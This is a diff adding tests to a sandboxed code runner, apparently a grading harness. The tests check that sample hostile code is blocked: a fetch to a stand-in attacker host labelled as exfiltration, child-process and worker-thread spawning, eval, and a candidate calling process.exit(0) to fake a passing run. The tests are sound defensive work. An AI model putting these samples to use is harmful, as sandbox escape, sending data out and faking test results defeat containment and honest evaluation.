@@ -83,5 +83,153 @@ describe("Isolated Code Runner", () => {
     expect(result.passed).toBe(true);
     delete process.env.SECRET_API_TOKEN_FOR_TEST;
   });
+
+  it("prohibits outbound network access via fetch", async () => {
+    const result = await executeCodeInSandbox({
+      language: "typescript",
+      code: `
+        export async function exfiltrateData() {
+          await fetch("https://attacker.example.com/steal");
+        }
+      `,
+      testCode: `
+        test("network calls must throw SecurityException", async () => {
+          let caught = false;
+          try {
+            await exfiltrateData();
+          } catch (e: any) {
+            caught = true;
+            if (!e.message.includes("SecurityException")) {
+              throw new Error("Expected SecurityException but got: " + e.message);
+            }
+          }
+          if (!caught) throw new Error("fetch was not intercepted!");
+        });
+      `,
+      timeoutMs: 3000,
+      memoryLimitMb: 64,
+    });
+
+    expect(result.success).toBe(true);
+    expect(result.passed).toBe(true);
+    expect(result.tests[0]?.passed).toBe(true);
+  });
+
+  it("prohibits host child process execution", async () => {
+    const result = await executeCodeInSandbox({
+      language: "typescript",
+      code: `
+        import cp from "node:child_process";
+        export function spawnAttack() {
+          return cp.execSync("whoami").toString();
+        }
+      `,
+      testCode: `
+        test("spawning child processes must be denied", () => {
+          let caught = false;
+          try {
+            spawnAttack();
+          } catch (e: any) {
+            caught = true;
+            const msg = e.message || String(e);
+            if (!msg.includes("restricted") && !msg.includes("ERR_ACCESS_DENIED") && !msg.includes("SecurityException")) {
+              throw new Error("Expected access denied error, got: " + msg);
+            }
+          }
+          if (!caught) throw new Error("execSync was permitted!");
+        });
+      `,
+      timeoutMs: 3000,
+      memoryLimitMb: 64,
+    });
+
+    expect(result.success).toBe(true);
+    expect(result.passed).toBe(true);
+    expect(result.tests[0]?.passed).toBe(true);
+  });
+
+  it("prohibits worker thread creation", async () => {
+    const result = await executeCodeInSandbox({
+      language: "typescript",
+      code: `
+        import { Worker } from "node:worker_threads";
+        export function spawnWorker() {
+          new Worker("console.log('pwn')", { eval: true });
+        }
+      `,
+      testCode: `
+        test("worker threads must be denied", () => {
+          let caught = false;
+          try {
+            spawnWorker();
+          } catch (e: any) {
+            caught = true;
+            const msg = e.message || String(e);
+            if (!msg.includes("restricted") && !msg.includes("ERR_ACCESS_DENIED") && !msg.includes("SecurityException")) {
+              throw new Error("Expected worker restriction error, got: " + msg);
+            }
+          }
+          if (!caught) throw new Error("Worker creation was permitted!");
+        });
+      `,
+      timeoutMs: 3000,
+      memoryLimitMb: 64,
+    });
+
+    expect(result.success).toBe(true);
+    expect(result.passed).toBe(true);
+    expect(result.tests[0]?.passed).toBe(true);
+  });
+
+  it("prohibits dynamic string code evaluation via eval()", async () => {
+    const result = await executeCodeInSandbox({
+      language: "typescript",
+      code: `
+        export function runDynamic(str: string) {
+          return eval(str);
+        }
+      `,
+      testCode: `
+        test("eval must throw EvalError", () => {
+          let caught = false;
+          try {
+            runDynamic("2 + 2");
+          } catch (e: any) {
+            caught = true;
+            if (!e.message.includes("disallowed")) {
+              throw new Error("Expected disallowed string code gen error, got: " + e.message);
+            }
+          }
+          if (!caught) throw new Error("eval was permitted!");
+        });
+      `,
+      timeoutMs: 3000,
+      memoryLimitMb: 64,
+    });
+
+    expect(result.success).toBe(true);
+    expect(result.passed).toBe(true);
+    expect(result.tests[0]?.passed).toBe(true);
+  });
+
+  it("rejects candidate code attempting to fake test pass via process.exit()", async () => {
+    const result = await executeCodeInSandbox({
+      language: "typescript",
+      code: `
+        // Malicious candidate attempts to exit with 0 before test suite executes
+        process.exit(0);
+      `,
+      testCode: `
+        test("legitimate test that should never be skipped", () => {
+          // If candidate aborted process, this wouldn't pass
+        });
+      `,
+      timeoutMs: 3000,
+      memoryLimitMb: 64,
+    });
+
+    // Must NOT pass because tests were intercepted or could not complete cleanly
+    expect(result.passed).toBe(false);
+  });
 });
 
